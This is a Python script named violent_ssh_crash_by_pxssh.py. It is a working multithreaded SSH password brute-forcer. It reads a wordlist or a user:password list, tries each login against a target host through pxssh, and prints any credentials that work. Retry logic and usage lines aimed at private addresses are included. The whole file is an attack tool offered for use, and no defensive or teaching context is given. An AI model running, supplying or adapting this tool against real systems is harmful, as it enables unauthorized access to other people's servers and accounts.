#!/usr/bin/python
# -*- coding: utf-8 -*-
# Created by shanfenglan on 2019-08-22

from threading import *
import optparse
import time
from pexpect import pxssh
import sys,os


maxconn = 5
connection_lock = Semaphore(maxconn)
Found = False
Fails = 0


def connect(host, user, password, release):
    global Found
    global Fails
    try:
        # print("开始")
        # print(host, user, password)
        s = pxssh.pxssh()
        s.login(host, user, password)
        print("\033[1;31;40m"+'[++++++++++]The '+host+'\'s ssh password is   ' + user+':'+password+"\033[0m")
        Found = True

    except Exception as e:
        # print("错误")
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
        else:
            pass
    finally:
        if release:
            connection_lock.release()


def main():
    parser = optparse.OptionParser('%prog -H <host or ip addr> -F <filename> -U <user> -L <user:passwd file>')
    parser.add_option("-H", dest="Host", help="specify target ip addr", type="string",
                      default='192.168.199.244')
    parser.add_option("-U", dest="user", help="specify target username", type='string', default='a')
    parser.add_option("-F", dest="password_file", help="specify password file", type='string', default='a')
    parser.add_option("-L", dest="upfile", help="user:passwd file", type='string', default='a')
    (options, args) = parser.parse_args()
    host = options.Host
    user = options.user
    passfile = options.password_file
    upfile = options.upfile
    if user != 'a':
        fn = open(passfile, 'r')
        for line in fn:
            connection_lock.acquire()
            password = line.strip('\n')  # strip the '\n'
            print('[-] Testing :' + str(password))
            if Found:
                print('[+] Password has been Found')
                exit(0)
            if Fails > 5:
                print('[-] Too many errors')
                exit(1)
            t = Thread(target=connect, args=(host, user, password, True))  # create a new thread
            t.start()
        fn.close()  # close the file
    elif upfile != 'a':
        fn = open(upfile, 'r')
        for line in fn:
            connection_lock.acquire()
            password = line.strip('\n')  # strip the '\n'
            userr,passwd = password.split(':')
            print('[-] Testing :' + str(password))
            t = Thread(target=connect, args=(host, userr, passwd, True))  # create a new thread
            t.start()
        fn.close()  # close the file
    else:
        print("""
        Error,please use argument '-h'!"
        exp:
        python3 violent_ssh_crash_by_pxssh.py -H 192.168.199.244 -U root -F /Users/shukasakai/Desktop/demo"
        python3 violent_ssh_crash_by_pxssh.py -H 192.168.199.244 -L /Users/shukasakai/Desktop/test      
              """)

if __name__ == '__main__':
    main()
    # os.system('python3 violent_ssh_crash_by_pxssh.py -H 172.16.250.130 -L /Users/shukasakai/Documents/daily_use.txt')

#python3 violent_ssh_crash_by_pxssh.py -H 192.168.199.244 -U root -F /Users/shukasakai/Desktop/demo
